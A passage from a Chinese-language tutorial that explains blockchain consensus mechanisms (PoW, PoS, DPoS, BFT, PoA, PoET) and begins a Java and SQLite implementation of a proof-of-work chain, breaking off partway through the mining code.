<p>然而，PoS机制也存在权力集中和节点不一定积极参与的问题，可能影响网络的安全性。</p>
<h4 id="2-3-权益质押（Delegated-Proof-of-Stake-DPoS）"><a href="#2-3-权益质押（Delegated-Proof-of-Stake-DPoS）" class="headerlink" title="2.3. 权益质押（Delegated Proof of Stake, DPoS）"></a>2.3. 权益质押（Delegated Proof of Stake, DPoS）</h4><p>权益质押是在PoS机制基础上的一种改进，其核心思想是通过代理节点来参与共识过程。DPoS机制具有以下特点：</p>
<p>快速和高吞吐：通过限制参与共识的节点数量，DPoS可以实现更快的交易确认和更高的吞吐量。</p>
<p>分散授权：持币者可以将代币委托给代理节点，从而实现更广泛的参与和分散的授权。</p>
<p>治理和决策：DPoS机制通常允许代币持有者就网络的治理和决策进行投票。</p>
<p>然而，DPoS机制也存在中心化风险和安全性相对较低的问题，代理节点数量较少可能导致权力集中。</p>
<h4 id="2-4-共识机制的组合（Hybrid）"><a href="#2-4-共识机制的组合（Hybrid）" class="headerlink" title="2.4. 共识机制的组合（Hybrid）"></a>2.4. 共识机制的组合（Hybrid）</h4><p>在实际应用中，也可以采用不同共识机制的组合，以取得各自机制的优势，实现更好的性能、安全性和可扩展性。通过综合不同机制，可以应对特定问题，如提高网络的能源效率或减少中心化风险。然而，混合共识机制可能引入更多的复杂性，需要权衡不同机制的权衡和劣势。</p>
<h4 id="2-5-区块链中的共识机制"><a href="#2-5-区块链中的共识机制" class="headerlink" title="2.5. 区块链中的共识机制"></a>2.5. 区块链中的共识机制</h4><p>共识机制在区块链技术中至关重要，确保所有节点对账本的修改达成一致。不同类型的区块链（公有链、私有链、联盟链）可以根据其需求选择适合的共识机制。以下是一些示例：</p>
<p>比特币（公有链）使用PoW共识机制，保障了分布式数字货币的安全性。</p>
<p>以太坊（公有链）已经过渡到PoS，以提高能源效率和可扩展性。</p>
<p>超级账本（联盟链）理论上支持所有共识机制，但需要自己实现。</p>
<p>深入理解共识机制的分类、特点和应用，有助于在不同场景中做出明智的选择，以满足区块链应用的需求。在接下来的章节中，我们将进一步深入探讨每种共识机制的工作原理、实际应用案例和未来发展趋势。</p>
<h3 id="3-常见共识机制详解"><a href="#3-常见共识机制详解" class="headerlink" title="3. 常见共识机制详解"></a>3. 常见共识机制详解</h3><p>在本章节中我们将介绍一些共识机制的原理、流程、优势以及他们的局限性</p>
<h4 id="3-1-工作量证明（Proof-of-Work，-PoW）"><a href="#3-1-工作量证明（Proof-of-Work，-PoW）" class="headerlink" title="3.1. 工作量证明（Proof of Work， PoW）"></a>3.1. 工作量证明（Proof of Work， PoW）</h4><p>工足量证明（Proof of Work， PoW）是一种十分常见的区块链共识机制，最早由比特币引入，以太坊1.0以及许多货币都使用工作量证明来当做他们的底层共识机制。它通过解决数学难题来证明参与者的工作量，从而获得创建新区块的权利。由于PoW的概念相对简单，因此十分适合新手们对共识机制进行学习。</p>
<h5 id="3-1-1-PoW的原理和流程"><a href="#3-1-1-PoW的原理和流程" class="headerlink" title="3.1.1. PoW的原理和流程"></a>3.1.1. PoW的原理和流程</h5><p>PoW的核心原理是基于哈希函数的不可预测性和随机性。在PoW中，矿工需要寻找一个特定的哈希值，使得区块头的哈希满足一定的条件，通常要求哈希值以一定数量的前导零开头。这个条件在数学上是难以预测的，唯一的方法是通过不断尝试不同的随机数来进行哈希计算，直到找到满足条件的哈希值，这需要大量的计算能力。</p>
<p>具体来说，PoW的原理可以概括为以下步骤：</p>
<p>（1）选择交易和构建区块头：矿工从交易池中选择一组待确认的交易，并构建区块头，包括前一个区块的哈希、交易列表的哈希等信息。</p>
<p>（2）挑战难题：网络根据当前的难度目标，提出一个数学难题，要求找到一个特定的哈希值，使得区块头的哈希满足条件。</p>
<p>（3）工作量竞赛：矿工开始尝试不同的随机数，将随机数插入区块头中，然后进行哈希计算。由于哈希函数的随机性，不同的随机数会产生不同的哈希值。</p>
<p>（4）寻找满足条件的哈希值：矿工不断尝试不同的随机数，计算区块头的哈希，直到找到一个哈希值，满足难题条件（即以一定数量的前导零开头）。</p>
<p>PoW的整体流程可以分为以下几个关键步骤：</p>
<p>（1）交易池和构建区块：首先，网络中的节点将待确认的交易放入交易池。矿工从交易池中选择一定数量的交易，并将它们组合成一个区块。</p>
<p>（2）难题设置：网络设定一个难度目标，通常是一个表示难度的数字。这个数字决定了满足难题条件的哈希值需要以多少前导零开头。</p>
<p>（3）工作量竞赛：矿工开始尝试不同的Nonce值，将Nonce插入区块头中，然后计算区块头的哈希值。</p>
<p>（4）验证和广播：一旦矿工找到满足条件的哈希值，就将该区块广播给网络中的其他节点。其他节点会验证这个区块的工作量，以确保矿工的计算是有效的。</p>
<p>（5）奖励和新区块：如果其他节点验证通过，该区块将被添加到区块链中作为新的区块。矿工获得一定数量的奖励，通常包括新发行的代币和交易手续费。</p>
<p><img src="/article/C:/Users/罗思远/AppData/Roaming/Typora/typora-user-images/image-20241018210050974.png" alt="image-20241018210050974"></p>
<h5 id="3-1-2-PoW的优势和局限性"><a href="#3-1-2-PoW的优势和局限性" class="headerlink" title="3.1.2. PoW的优势和局限性"></a>3.1.2. PoW的优势和局限性</h5><p>PoW作为一种经典的共识算法，具有以下优势：</p>
<p>（1）安全性高： PoW机制的安全性源于解决数学难题的复杂性。攻击者需要大量计算能力来篡改数据，阻碍了恶意行为。</p>
<p>（2）抵抗攻击： 攻击者需要掌握网络中大多数计算能力，才能控制网络。这在实际上是难以实现的，保障了网络的去中心化和安全性。</p>
<p>（3）去中心化： PoW鼓励广泛的节点参与共识，没有中心化的控制权。网络中的参与者通过竞争解决难题来获得权利，没有单一实体能够垄断共识过程。</p>
<p>然而，PoW也存在以下局限性：</p>
<p>（1）能源消耗： PoW机制耗费大量电力，特别是随着竞争的加剧，电力消耗逐渐增大，引发环保和可持续性问题。</p>
<p>（2）性能瓶颈： 由于难题的复杂性，计算量逐渐增加，可能导致网络吞吐量下降，交易确认时间延长。通常需要数个区块确认后，交易才能被视为有效。这可能导致用户体验不佳，尤其是在需要快速完成交易的场景中。</p>
<p>（3）中心化趋势： 为了获得更高的算力，矿工可能加入矿池，导致算力集中在少数矿池，增加了中心化风险。</p>
<p>PoW在理论上是去中心化的，允许任何人参与，但在实践中，由于经济因素和技术要求，它可能会导致算力集中在少数矿池和资源丰富的参与者手中。这种现象并不是说PoW完全去中心化或完全中心化，而是存在一种动态的权衡。</p>
<p>最后工作量证明机制是区块链技术的重要组成部分，尤其在比特币等公有链中发挥着关键作用。然而，其高能耗和潜在的中心化趋势也促使人们寻求更环保、更分散化的共识机制。在实际应用中，需要权衡PoW的优势与局限性，结合具体需求做选择。</p>
<h4 id="3-2-权益证明（Proof-of-Stake，-Pos）"><a href="#3-2-权益证明（Proof-of-Stake，-Pos）" class="headerlink" title="3.2. 权益证明（Proof of Stake， Pos）"></a>3.2. 权益证明（Proof of Stake， Pos）</h4><p>权益证明（Proof of Stake，PoS）是一种与工作量证明（PoW）不同的区块链共识机制，它通过参与者持有的代币数量来决定其创建新区块的权利。PoS机制的核心思想是通过代币的权益来分配网络中的权力和责任，以实现共识过程。</p>
<h5 id="3-2-1-PoS的原理和流程"><a href="#3-2-1-PoS的原理和流程" class="headerlink" title="3.2.1. PoS的原理和流程"></a>3.2.1. PoS的原理和流程</h5><p>PoS的核心思想是，持有更多代币的参与者在网络中具有更大的权利和责任。与PoW中通过解决数学难题来获得权利不同，PoS中的权利分配是根据持有的代币数量来确定的。参与者需要将一定数量的代币锁定（抵押）在网络中，作为参与共识的凭证。他们的抵押数量决定了他们被选中的概率。PoS的整体流程可以分为以下几个关键步骤：</p>
<p>（1）抵押代币：参与者将一定数量的代币抵押到网络中。这些代币将被锁定，作为参与共识的凭证。抵押的数量通常与被选中的概率成正比。</p>
<p>（2）选择出块节点：网络根据参与者抵押的代币数量来选择出块节点，即有权力创建新区块的节点。持有更多代币的参与者被选中的概率更高。</p>
<p>（3）验证和创建区块：被选中的出块节点负责验证交易和创建新区块。他们收集待确认的交易，构建区块，然后进行签名和广播。</p>
<p>（4）奖励和惩罚：如果出块节点成功创建新区块，他们将获得交易手续费和一定数量的奖励。然而，如果出块节点的行为被发现有问题，比如双花攻击，他们的抵押代币可能会被惩罚。</p>
<h5 id="3-2-2-PoS的优势和局限性"><a href="#3-2-2-PoS的优势和局限性" class="headerlink" title="3.2.2. PoS的优势和局限性"></a>3.2.2. PoS的优势和局限性</h5><p>PoS相较于其他证明方式有以下几点优势：</p>
<p>（1）能源效率：PoS相对于PoW来说，能源消耗大幅降低。PoW机制需要大量计算能力解决复杂难题，而PoS则通过代币抵押来选取节点，无需大量能源消耗。这使得PoS成为一种更环保和可持续的共识机制。</p>
<p>（2）去中心化：PoS鼓励代币持有者积极参与共识过程，避免了PoW中可能出现的算力集中问题。持有更多代币的节点在共识中具有更大的权利，但这不同于PoW中算力竞争，不会导致资源垄断。</p>
<p>（3）安全性：PoS机制中，攻击者需要掌握大量代币才能攻击网络，这增加了攻击的成本和难度。这种设计保障了网络的安全性，因为攻击者需要破坏自身的利益来进行攻击。</p>
<p>（4）能够扩展性：PoS机制相对于PoW更容易实现扩展性，因为无需进行复杂的计算，节点只需要对交易进行验证和区块创建。这使得网络可以更轻松地处理更多的交易和数据。</p>
<p>（5）减少硬件竞争：PoW机制中，矿工为了获得更高的算力，不断更新硬件，造成资源浪费。在PoS中，算力不是关键因素，减少了硬件竞争，节约了资源。</p>
<p>同时PoS也有局限性和不足之处，主要有以下几点：</p>
<p>（1）权力集中：虽然PoS鼓励代币持有者参与共识，但拥有更多代币的参与者在网络中拥有更大的权力。这可能导致权力集中问题，让少数人掌控网络决策。</p>
<p>（2）节点激励问题：拥有代币并不一定意味着节点会积极参与共识过程。一些节点可能缺乏积极性，影响网络的安全性和稳定性。</p>
<p>（3）链长问题：PoS机制中，参与者倾向于选择拥有更多代币的链，导致链长问题。这可能让拥有更多代币的人在网络决策中拥有更大话语权，不利于去中心化。</p>
<p>（4）初始分配不公平：PoS的初始分配可能存在不公平性，最初拥有代币的人在网络中拥有更大的权利。这可能导致财富不平等问题。</p>
<p>（5）算法设计复杂性：PoS的算法设计相对复杂，需要考虑权益抵押、随机性等因素。一个不合理的设计可能导致系统不稳定或易受攻击。</p>
<p>综合来看，PoS作为一种区块链共识机制，在解决了能源消耗和性能问题的同时，也面临着权力集中、节点激励和初始分配不公平等一系列挑战。在选择PoS作为共识机制时，需要充分考虑其优势和局限性，结合具体应用场景做出合适的决策。</p>
<h4 id="3-3-其他常见的共识机制"><a href="#3-3-其他常见的共识机制" class="headerlink" title="3.3. 其他常见的共识机制"></a>3.3. 其他常见的共识机制</h4><p>除了工作量证明（PoW）和权益证明（PoS），在区块链领域还存在许多其他有趣和创新的共识机制，它们各自针对不同的问题和需求，旨在提供更高效、更安全、更快速的共识算法。以下是一些其他常见的共识机制的简要介绍：</p>
<ol>
<li>权威共识（Delegated Proof of Stake，DPoS）<br>权威共识是一种基于代表性和选举的共识机制，代币持有者通过投票选举一组代表来确认交易和生成区块。这些代表通常由社区选出，负责验证交易和维护网络。DPoS具有较高的交易处理速度和可扩展性，但也引入了一定程度的中心化，因为少数代表可能掌握网络控制权。</li>
<li>拜占庭容错（Byzantine Fault Tolerance，BFT）<br>拜占庭容错是一种强调在节点存在故障或恶意行为时仍然能够保持一致性的共识机制。它适用于分布式系统中存在不确定性和节点间通信存在延迟的情况。拜占庭容错机制确保只要节点中的大多数诚实，就能达成共识。Hyperledger Fabric等区块链项目采用了BFT共识机制。</li>
<li>权益授权（Proof of Authority，PoA）<br>权益授权是一种基于授权节点的共识机制，网络中的节点由已授权的实体管理。授权实体通常是已知的组织或个人，他们负责验证交易并生成新区块。PoA具有高度的安全性和性能，但在去中心化方面存在局限，因为网络的控制权被集中在少数授权实体手中。</li>
<li>流动性共识（Proof of Liquidity，PoL）<br>流动性共识是一种将流动性提供者纳入共识过程的机制。持有代币的用户可以将代币锁定在智能合约中，以提供流动性支持，同时获得交易手续费和奖励。这种共识机制鼓励流动性提供者参与，增加了网络的交易吞吐量。</li>
<li>时间证明（Proof of Elapsed Time，PoET）<br>时间证明是一种通过随机等待时间来选择区块生成者的共识机制。每个节点在等待一段随机时间后，竞争获得出块的权利。这种机制在Hyperledger Sawtooth等项目中得到了应用。<br>这仅仅是一小部分其他常见共识机制的简要介绍。随着区块链技术的发展，还可能会出现新的共识算法，以满足不同场景下的需求。选择适合的共识机制需要根据项目的目标、安全性要求、性能需求等多方面因素进行权衡。</li>
</ol>
<h2 id="第二部分：PoW共识机制实践"><a href="#第二部分：PoW共识机制实践" class="headerlink" title="第二部分：PoW共识机制实践"></a>第二部分：PoW共识机制实践</h2><p>共识机制的主要目标是确保在分布式网络中的节点之间就特定的事务或状态达成一致。在这一特性的基础上，工作量证明（Proof of Work，PoW）机制可以被看作是一种简单而直接的方式来体现这一理念。其核心思想是定义一个共同的目标，然后根据不同机器的计算能力来先算出这个目标的结果。计算成功后，算出结果的机器将通知其他节点，其他节点在收到通知后会验证这个结果，一旦验证通过，当前区块的计算即被终止，这个结果会被广泛接受并被用于产生新的区块。</p>
<h3 id="1-区块表结构"><a href="#1-区块表结构" class="headerlink" title="1. 区块表结构"></a>1. 区块表结构</h3><p>我们会使用新组件SQLite来构建我们的区块链表，使用SQLite的原因如下：</p>
<ul>
<li><p>轻量级：SQLite 是一个嵌入式数据库，资源占用少，非常适合嵌入到区块链应用中，特别是在资源有限的设备上。</p>
</li>
<li><p>无服务器架构：SQLite 不需要单独的服务器进程，所有数据存储在一个文件中，简化了部署和管理，提高了可用性。</p>
</li>
<li><p>快速读写：对于小型数据集，SQLite 的读写性能非常高，能够满足快速交易处理的需求。</p>
</li>
<li><p>跨平台支持：SQLite 可以在多种操作系统上运行，便于在不同环境中进行开发和部署。</p>
</li>
<li><p>简单易用：SQLite 的API简单，易于集成，开发者可以快速上手并实现功能</p>
</li>
<li><p>SQLite的应用：在 Android 开发中，SQLite 是官方推荐的本地数据存储解决方案。浏览器如 Chrome 和 Firefox 就使用 SQLite 存储浏览历史、书签等数据。</p>
</li>
</ul>
<ol>
<li>首先是block表，block表拥有以下字段</li>
</ol>
<p><img src="/article/C:/Users/罗思远/AppData/Roaming/Typora/typora-user-images/image-20241018210142829.png" alt="image-20241018210142829"></p>
<p>下面是建表语句</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String <span class="title function_">getBlockSql</span><span class="params">(String index)</span> &#123;</span><br><span class="line">		<span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;CREATE TABLE IF NOT EXISTS [block&quot;</span> + index + <span class="string">&quot;] (&quot;</span> + </span><br><span class="line">				<span class="string">&quot;[ID] INTEGER  PRIMARY KEY AUTOINCREMENT NOT NULL,&quot;</span> + </span><br><span class="line">				<span class="string">&quot;[blockIndex] TEXT  NOT NULL,&quot;</span> +</span><br><span class="line">				<span class="string">&quot;[preBlockHash] VARCHAR(300)  NOT NULL,&quot;</span> +</span><br><span class="line">				<span class="string">&quot;[path] VARCHAR(300)  UNIQUE NOT NULL,&quot;</span> + </span><br><span class="line">				<span class="string">&quot;[createTime]  VARCHAR(50)  NOT NULL,&quot;</span> + </span><br><span class="line">				<span class="string">&quot;[blockHash] VARCHAR(300)  UNIQUE NOT NULL,&quot;</span> +</span><br><span class="line">				<span class="string">&quot;[randomNumber] TEXT  NOT NULL,&quot;</span> +</span><br><span class="line">				<span class="string">&quot;[onMingChain] INTEGER DEFAULT &#x27;0&#x27; NOT NULL&quot;</span> +</span><br><span class="line">				<span class="string">&quot;)&quot;</span>;</span><br><span class="line">		<span class="keyword">return</span> sql;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<p>blockIndex：区块号</p>
<p>preBlockHash：上一块区块的哈希</p>
<p>path：区块对应的区块文件</p>
<p>createTime：区块创建时间</p>
<p>blockHash：本区块哈希</p>
<p>randomNumber：随机幸运数</p>
<p>onMingChain：该区块是否在主链上</p>
<p>block表主要是用来存储区块对应的信息</p>
<p><img src="/article/C:/Users/罗思远/AppData/Roaming/Typora/typora-user-images/image-20241018210209169.png" alt="image-20241018210209169"></p>
<ol start="2">
<li>dictionary表</li>
</ol>
<p>dictionary表主要存储区块的当前配置</p>
<p><img src="/article/C:/Users/罗思远/AppData/Roaming/Typora/typora-user-images/image-20241018210230700.png" alt="image-20241018210230700"></p>
<p>建表语句</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String <span class="title function_">getDicSql</span><span class="params">()</span> &#123;</span><br><span class="line">		<span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;CREATE TABLE IF NOT EXISTS [dictionary] (&quot;</span> + </span><br><span class="line">				<span class="string">&quot;[module] VARCHAR(20)  NOT NULL,&quot;</span> + </span><br><span class="line">				<span class="string">&quot;[key] VARCHAR(20)  NOT NULL,&quot;</span> + </span><br><span class="line">				<span class="string">&quot;[value] VARCHAR(20)  NOT NULL&quot;</span> + </span><br><span class="line">				<span class="string">&quot;)&quot;</span>;</span><br><span class="line">		<span class="keyword">return</span> sql;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<p>数据展示</p>
<p><img src="/article/C:/Users/罗思远/AppData/Roaming/Typora/typora-user-images/image-20241018210248992.png" alt="image-20241018210248992"></p>
<p>module：什么模块</p>
<p>key：键名</p>
<p>value：键名对应的值</p>
<p>currentBlockIndex：节点当前更新到的区块</p>
<p>blockIndex：网络中当前最大区块</p>
<p>difficulty：挖掘难度</p>
<ol start="3">
<li>pending表</li>
</ol>
<p>用来存储等待打包的交易</p>
<p><img src="/article/C:/Users/罗思远/AppData/Roaming/Typora/typora-user-images/image-20241018210307347.png" alt="image-20241018210307347"></p>
<p>建表语句</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String <span class="title function_">getPendingSql</span><span class="params">()</span> &#123;</span><br><span class="line">	<span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;CREATE TABLE IF NOT EXISTS [pending] (&quot;</span> + </span><br><span class="line">			<span class="string">&quot;[orderNo] VARCHAR(200)  UNIQUE NOT NULL,&quot;</span> + </span><br><span class="line">			<span class="string">&quot;[tradeBody] TEXT  NOT NULL,&quot;</span> +</span><br><span class="line">			<span class="string">&quot;[tradeType] VARCHAR(1)  NULL,&quot;</span> + </span><br><span class="line">			<span class="string">&quot;[createTime] VARCHAR(50) NOT NULL&quot;</span> + </span><br><span class="line">			<span class="string">&quot;)&quot;</span>;</span><br><span class="line">	<span class="keyword">return</span> sql;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>orderNo：交易号</p>
<p>tradeBody：交易体，包含了交易数据等等</p>
<p>tradeType：交易类型,普通交易或者合约交易</p>
<p>createTime：交易的创建时间</p>
<h3 id="2-代码实现"><a href="#2-代码实现" class="headerlink" title="2. 代码实现"></a>2. 代码实现</h3><p>引导节点仓库地址：<a href="https://gitee.com/daitoulin/p2p_bootstrap.git">https://gitee.com/daitoulin/p2p_bootstrap.git</a></p>
<p>对等节点仓库地址：<a href="https://gitee.com/daitoulin/block_chain.git">https://gitee.com/daitoulin/block_chain.git</a></p>
<h4 id="2-1-难题设置以及工作量竞赛"><a href="#2-1-难题设置以及工作量竞赛" class="headerlink" title="2.1. 难题设置以及工作量竞赛"></a>2.1. 难题设置以及工作量竞赛</h4><p>首先来看下我们区块的实体类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.blockchain.entity.block;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> lombok.Getter;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Block</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String blockIndex;</span><br><span class="line">    <span class="keyword">public</span> String blockHash;</span><br><span class="line">    <span class="keyword">public</span> String preBlockHash;</span><br><span class="line">    <span class="keyword">public</span> String workLoad;</span><br><span class="line">    <span class="keyword">public</span> String createTime;</span><br><span class="line">    <span class="keyword">public</span> String path;</span><br><span class="line">    <span class="keyword">public</span> String dataJson;</span><br><span class="line">    <span class="keyword">public</span> String tradeIds;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> id;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">workString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Block&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;blockIndex=&#x27;&quot;</span> + blockIndex + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, blockPreHash=&#x27;&quot;</span> + preBlockHash + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, workLoad=&#x27;&quot;</span> + workLoad + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, dataJson=&#x27;&quot;</span> + dataJson + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, createTime=&#x27;&quot;</span> + createTime + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, randomNumber=&#x27;&quot;</span> + randomNumber + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, tradeIds=&#x27;&quot;</span> + tradeIds + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Block&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;blockIndex=&#x27;&quot;</span> + blockIndex + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, blockHash=&#x27;&quot;</span> + blockHash + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, blockPreHash=&#x27;&quot;</span> + preBlockHash + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, workLoad=&#x27;&quot;</span> + workLoad + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, dataJson=&#x27;&quot;</span> + dataJson + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, createTime=&#x27;&quot;</span> + createTime + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, path=&#x27;&quot;</span> + path + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, tradeIds=&#x27;&quot;</span> + tradeIds + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, randomNumber=&#x27;&quot;</span> + randomNumber + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getBlockIndex</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> blockIndex;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setBlockIndex</span><span class="params">(String blockIndex)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.blockIndex = blockIndex;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getBlockHash</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> blockHash;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setBlockHash</span><span class="params">(String blockHash)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.blockHash = blockHash;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getPreBlockHash</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> preBlockHash;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setPreBlockHash</span><span class="params">(String preBlockHash)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.preBlockHash = preBlockHash;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getWorkLoad</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> workLoad;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String randomNumber;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getPath</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> path;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setPath</span><span class="params">(String path)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.path = path;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setWorkLoad</span><span class="params">(String workLoad)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.workLoad = workLoad;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getCreateTime</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> createTime;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setCreateTime</span><span class="params">(String createTime)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.createTime = createTime;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getId</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setId</span><span class="params">(<span class="type">int</span> id)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.id = id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getRandomNumber</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> randomNumber;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setRandomNumber</span><span class="params">(String randomNumber)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.randomNumber = randomNumber;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getDataJson</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> dataJson;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setDataJson</span><span class="params">(String dataJson)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.dataJson = dataJson;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getTradeIds</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> tradeIds;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setTradeIds</span><span class="params">(String tradeIds)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.tradeIds = tradeIds;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>一些常用的其他实体：</p>
<ul>
<li>TradeBodyPool 交易池对象</li>
<li>BlockDownLoad 区块下载对象</li>
</ul>
<p>首先定义了两个数字变量，用来判断其他节点给我们返回的结果。然后从定时任务中取出当前的区块号，对区块号进行校验，如果是第一块区块则需要进行特殊处理，因为第一块区块是没有前一块区块的哈希值的。对Block对象进行赋值，需要取出交易池中的pending对象，将交易的哈希值取出进行接下来的计算工作。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">System.out.println(<span class="string">&quot;开始运算---------------------&quot;</span>);</span><br><span class="line"><span class="type">int</span> <span class="variable">trueCount</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> <span class="variable">falseCount</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">preBlockIndex</span> <span class="operator">=</span> String.valueOf(UpdateTimer.currentMaxBlockIndex);</span><br><span class="line">BlockServiceImpl.checkBlockTable(preBlockIndex);</span><br><span class="line">List&lt;Block&gt; blocks = BlockServiceImpl.queryBlockByBlockIndex(preBlockIndex);</span><br><span class="line"><span class="type">Block</span> <span class="variable">currentBlock</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"><span 